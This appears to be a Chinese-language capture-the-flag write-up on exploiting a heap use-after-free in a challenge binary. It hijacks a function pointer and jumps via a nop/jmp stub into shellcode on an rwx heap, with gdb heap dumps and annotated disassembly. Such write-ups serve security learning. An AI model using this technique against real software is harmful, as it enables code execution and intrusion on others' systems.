### 解题思路

free的时候没有置空指针，show的时候会先判断此索引位置func_table_list偏移0x10是否为预先设置的函数，是则正常走流程，否则调用Index[idx]->0x10处的指针

程序每Add一次，添加一个0x20的索引堆块和一个保存数字的堆块

只需要设法将一个索引堆块的prev改成

In [12]: print disasm('90eb4d00'.decode('hex'))
   0:   90                      nop  
   1:   eb 4d                   jmp    0x50  

并将shellcode写入+0x50的堆块中，就能执行（加壳的程序堆块设置的权限是rwx）


gdb-peda$ heapinfo  
(0x20)     fastbin[0]: 0x5621e1d04d00 --> 0x5621e1d04d70 --> `0x5621e1d04c50` --> 0x0  
(0x30)     fastbin[1]: 0x0  
(0x40)     fastbin[2]: 0x0  
(0x50)     fastbin[3]: 0x5621e1d04d20 --> 0x5621e1d04d90 --> 0x0  
(0x60)     fastbin[4]: 0x0  
(0x70)     fastbin[5]: 0x0  
(0x80)     fastbin[6]: 0x0  
(0x90)     fastbin[7]: 0x0  
(0xa0)     fastbin[8]: 0x0  
(0xb0)     fastbin[9]: 0x0  
                  top: 0x5621e1d04de0 (size : 0x20220)   
       last_remainder: 0x0 (size : 0x0)   
            unsortbin: 0x5621e1d04c70 (size : 0x90)  
gdb-peda$ parseheap   
addr                prev                size                 status              fd                bk                    
0x5621e1cf3000      0x0                 0x11c10              Used                None              None  
0x5621e1d04c10      0x0                 0x20                 Used                None              None    
0x5621e1d04c30      0x6                 0x20                 Used                None              None    
`0x5621e1d04c50`      0xcccccc004deb90    0x20                 Freed                0x0              None  
0x5621e1d04c70      0x20                0x90                 Freed     0x7fbcd1d27b78    0x7fbcd1d27b78  
0x5621e1d04d00      0x90                0x20                 Freed     0x5621e1d04d70              None  
0x5621e1d04d20      0x10                0x50                 Freed     0x5621e1d04d90              None  
0x5621e1d04d70      0x0                 0x20                 Freed     0x5621e1d04c50              None  
0x5621e1d04d90      0x10                0x50                 Freed                0x0              None  

调用Index[idx]->0x10要寻址两次

.text:0000000000001844                 lea     rdx, Index   
.text:000000000000184B                 mov     rdi, [rdx+rax*8]  # rax=0 , rdi=0x5621e1d04d10  
.text:000000000000184F                 test    rdi, rdi  
.text:0000000000001852                 jz      short loc_18C8   
.text:0000000000001854                 mov     rax, [rdi]  # rax=0x5621e1d04d70  
.text:0000000000001857                 lea     rdx, sub_1E20    
.text:000000000000185E                 mov     rax, [rax+10h]  # rax=0x5621e1d04c50  


